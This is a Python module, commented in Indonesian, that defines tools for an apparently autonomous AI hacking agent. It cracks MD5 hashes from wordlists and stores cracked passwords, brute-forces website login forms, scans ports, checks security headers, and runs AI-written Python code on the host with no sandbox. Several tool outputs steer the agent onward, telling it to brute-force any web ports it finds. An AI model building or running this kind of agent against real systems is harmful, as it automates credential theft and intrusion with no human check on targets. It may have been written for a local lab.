import hashlib
import asyncio
import aiosqlite
import aiohttp
import asyncio
from memory import DB_NAME, cek_memori_hash
import numpy as np
from sklearn.metrics.pairwise import cosine_similarity
from sentence_transformers import SentenceTransformer
#

# Memuat "Otak Pembaca" SBERT (Ini akan terunduh otomatis saat pertama kali dijalankan)
print("⏳ Memuat model SBERT untuk Perpustakaan Ilmu...")
sbert_model = SentenceTransformer('all-MiniLM-L6-v2')
print("✅ Model SBERT siap!")

# ==========================================
# GUDANG SENJATA (FUNGSI DETERMINISTIK)
# ==========================================

async def tool_baca_panduan(pertanyaan: str) -> str:
    """
    Membaca dokumen_rahasia.txt dan mencari kalimat yang paling relevan dengan pertanyaan.
    """
    print(f"📚 [EKSEKUTOR] Mencari info di buku panduan tentang: '{pertanyaan}'...")
    
    try:
        # Membaca file txt
        with open("dokumen_rahasia.txt", "r", encoding="utf-8") as f:
            teks = f.read()
        
        # Memotong teks menjadi per baris (kita anggap 1 baris = 1 ilmu)
        baris_ilmu = [b.strip() for b in teks.split('\n') if b.strip()]
        
        if not baris_ilmu:
            return "❌ [INFO] Dokumen rahasia kosong."

        # MENGUBAH TEKS MENJADI VEKTOR MATEMATIKA
        vektor_dokumen = sbert_model.encode(baris_ilmu)
        vektor_pertanyaan = sbert_model.encode([pertanyaan])

        # Menghitung kemiripan (seberapa dekat jarak vektor pertanyaan dengan dokumen)
        skor_kemiripan = cosine_similarity(vektor_pertanyaan, vektor_dokumen)[0]
        
        # Mengambil ilmu dengan skor paling mirip
        indeks_terbaik = np.argmax(skor_kemiripan)
        skor_tertinggi = skor_kemiripan[indeks_terbaik]

        # Jika skornya di atas 0.3 (cukup relevan), kita berikan ke AI
        if skor_tertinggi > 0.3: 
            jawaban = baris_ilmu[indeks_terbaik]
            return f"📖 [PANDUAN DITEMUKAN] (Akurasi: {skor_tertinggi:.2f}):\n{jawaban}"
        else:
            return "❌ [INFO] Tidak ada panduan yang relevan untuk situasi ini."
            
    except FileNotFoundError:
        return "❌ [ERROR] File dokumen_rahasia.txt belum dibuat."
    
async def tool_crack_md5(target_hash: str, wordlist: list) -> str:
    """
    Fungsi untuk melakukan Brute Force pada hash MD5.
    Hanya akan melakukan komputasi jika hash belum ada di memori.
    """
    # 1. CEK MEMORI: AI mengingat pengalaman masa lalunya
    password_tersimpan = await cek_memori_hash(target_hash)
    if password_tersimpan:
        return f"✅ [MEMORI] Bos, saya ingat hash {target_hash} ini! Passwordnya adalah '{password_tersimpan}'. (Komputasi: 0 detik)"

    # 2. EKSEKUSI FISIK: Jika belum tahu, lakukan Brute Force
    print(f"⚙️ [EKSEKUTOR] Menjalankan brute force untuk hash: {target_hash}...")
    for word in wordlist:
        word_hash = hashlib.md5(word.encode()).hexdigest()
        
        # Jika password cocok
        if word_hash == target_hash:
            # 3. BELAJAR: Catat keberhasilan ke dalam memori
            async with aiosqlite.connect(DB_NAME) as db:
                await db.execute(
                    "INSERT OR REPLACE INTO hash_log (target_hash, cracked_password, status) VALUES (?, ?, 'SUCCESS')",
                    (target_hash, word)
                )
                await db.commit()
            return f"🔥 [BERHASIL] Hash {target_hash} jebol! Password: '{word}'"

    # 4. Jika gagal, catat juga agar AI tahu wordlist ini sudah tidak berguna
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute(
            "INSERT OR IGNORE INTO hash_log (target_hash, cracked_password, status) VALUES (?, 'UNKNOWN', 'FAILED')",
            (target_hash,)
        )
        await db.commit()
    
    return f"❌ [GAGAL] Brute force selesai. Tidak ada yang cocok di wordlist."

async def tool_eksekusi_python(kode_python: str) -> str:
    """
    Menyimpan string kode_python ke dalam file sementara dan menjalankannya di OS.
    """
    print("⚡ [EKSEKUTOR] AI Sedang membuat dan menjalankan senjata kodenya sendiri...")
    
    nama_file = "senjata_sementara.py"
    
    try:
        # 1. AI Menulis kode ke dalam file
        with open(nama_file, "w", encoding="utf-8") as f:
            f.write(kode_python)
            
        # 2. Kita suruh Linux menjalankan file tersebut
        proses = await asyncio.create_subprocess_exec(
            "python", nama_file,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        # 3. Kita beri batas waktu 15 detik agar komputer tidak hang 
        # jika AI membuat kode yang looping tanpa henti (infinite loop)
        stdout, stderr = await asyncio.wait_for(proses.communicate(), timeout=15.0)
        
        output = stdout.decode().strip()
        error = stderr.decode().strip()
        
        # 4. Kembalikan hasilnya ke Otak AI
        if proses.returncode == 0:
            return f"✅ [EKSEKUSI BERHASIL]:\n{output}"
        else:
            return f"❌ [EKSEKUSI GAGAL (SYNTAX ERROR)]:\n{error}\n(Sistem -> AI: Perbaiki kodemu dan coba lagi!)"
            
    except asyncio.TimeoutError:
        proses.kill()
        return "❌ [ERROR] Eksekusi dihentikan paksa karena terlalu lama (Timeout > 15 detik). Mungkin kodemu mengalami Infinite Loop."
    except Exception as e:
        return f"❌ [ERROR SISTEM FATAL]: {e}"

async def tool_analisis_keamanan(target_url: str) -> str:
    """
    Melakukan audit cepat pada URL target untuk mencari kelemahan dasar.
    """
    print(f"🕵️ [EKSEKUTOR] Melakukan audit keamanan (Vulnerability Scan) pada {target_url}...")
    laporan = []
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(target_url, timeout=5) as response:
                headers = response.headers
                html = await response.text()
                html_lower = html.lower()
                
                # 1. Cek Protokol (HTTP vs HTTPS)
                if target_url.startswith("http://"):
                    laporan.append("- ⚠️ URL menggunakan HTTP biasa (Rentan penyadapan/Sniffing).")
                
                # 2. Cek Kebocoran Identitas Server
                server_info = headers.get("Server", "")
                if server_info:
                    laporan.append(f"- ⚠️ Informasi Server Bocor: '{server_info}'. Hacker bisa mencari exploit khusus untuk versi ini.")
                
                # 3. Cek Keamanan Header (Clickjacking & XSS)
                if "X-Frame-Options" not in headers:
                    laporan.append("- ⚠️ Kelemahan Clickjacking: Header 'X-Frame-Options' tidak ditemukan.")
                if "Content-Security-Policy" not in headers:
                    laporan.append("- ⚠️ Rentan injeksi skrip (XSS): Header 'Content-Security-Policy' tidak ada.")
                
                # 4. Cek Form Login yang rapuh
                if "<form" in html_lower and "password" in html_lower:
                    if "csrf" not in html_lower:
                        laporan.append("- ⚠️ Ditemukan Form Login, tapi tidak ada token CSRF. Rentan terhadap serangan Brute Force dan manipulasi form.")
                        
    except Exception as e:
        return f"❌ [ERROR] Gagal melakukan audit. Detail: {e}"
        
    if laporan:
        hasil = "\n".join(laporan)
        return (
            f"🔍 [HASIL AUDIT KEAMANAN - {target_url}]:\n"
            f"{hasil}\n\n"
            f"(Sistem -> AI: Rangkum dan laporkan kelemahan ini kepada Bos dengan gaya analis yang profesional!)"
        )
    else:
        return f"✅ [HASIL AUDIT]: Tidak ditemukan kelemahan standar pada {target_url}. Web cukup aman."

async def tool_bruteforce_web(target_url: str, username: str, wordlist: list) -> str:
    """
    Fungsi untuk melakukan brute force pada halaman login sebuah website.
    AI akan memanggil ini jika mendeteksi form login.
    """
    print(f"⚙️ [EKSEKUTOR] Memulai serangan Web Brute Force ke {target_url} untuk user '{username}'...")
    
    # Kita menggunakan aiohttp ClientSession agar koneksi jauh lebih cepat
    async with aiohttp.ClientSession() as session:
        for password in wordlist:
            # Data yang biasanya dikirim saat form login di-submit (POST)
            payload = {
                "username": username,
                "password": password
            }
            
            try:
                async with session.post(target_url, data=payload, timeout=2) as response:
                    teks_balasan = await response.text()
                    teks_balasan_lower = teks_balasan.lower()
                    
                    # LOGIKA SUKSES
                    if "selamat" in teks_balasan_lower or "buka kado" not in teks_balasan_lower:
                        # Kita tambahkan teks_balasan ke dalam output!
                        return (
                            f"🔥 [BERHASIL] Login Web tembus!\n"
                            f"🎯 Target: {target_url}\n"
                            f"🔑 Password: {password}\n"
                            f"📄 [RESPON SERVER]:\n"
                            f"{'-'*40}\n"
                            f"{teks_balasan.strip()}\n"
                            f"{'-'*40}"
                        )
                    
                    print(f"   [INFO] Mencoba '{password}'... Gagal.")
            except Exception as e:
                return f"❌ [ERROR] Gagal menghubungi target {target_url}. Pastikan server menyala. Detail: {str(e)}"
            
            # Memberikan jeda sangat kecil agar tidak dituduh DDoS oleh server lokal sendiri
            await asyncio.sleep(0.1)

    return f"❌ [GAGAL] Seluruh wordlist telah dicoba untuk '{username}'. Tidak ada yang cocok."

async def cek_port(ip: str, port: int) -> int:
    """Fungsi internal pembantu untuk mengecek satu port"""
    try:
        # Kita beri batas waktu (timeout) sangat cepat: 0.5 detik
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port), timeout=0.5
        )
        writer.close()
        await writer.wait_closed()
        return port
    except Exception:
        return 0

async def tool_scan_port(target_ip: str) -> str:
    """
    Fungsi untuk memindai port yang terbuka pada sebuah IP.
    """
    print(f"📡 [EKSEKUTOR] Memindai celah port di target {target_ip}...")
    
    # Daftar port umum (termasuk port 5000 web Anda)
    port_umum = [21, 22, 80, 443, 3306, 5000, 8080]
    
    # Menjalankan pengecekan semua port secara bersamaan (Concurrent)
    tasks = [cek_port(target_ip, p) for p in port_umum]
    results = await asyncio.gather(*tasks)
    
    port_terbuka = [p for p in results if p != 0]
    
    if port_terbuka:
        return f"🔍 [INFO PENTING] Port yang terbuka di {target_ip} adalah: {port_terbuka}. (Catatan untuk AI: Jika ada port 80, 5000, atau 8080, itu adalah server web, pertimbangkan untuk menggunakan tool_bruteforce_web)."
    else:
        return f"❌ [GAGAL] Tidak ada port umum yang terbuka di {target_ip}."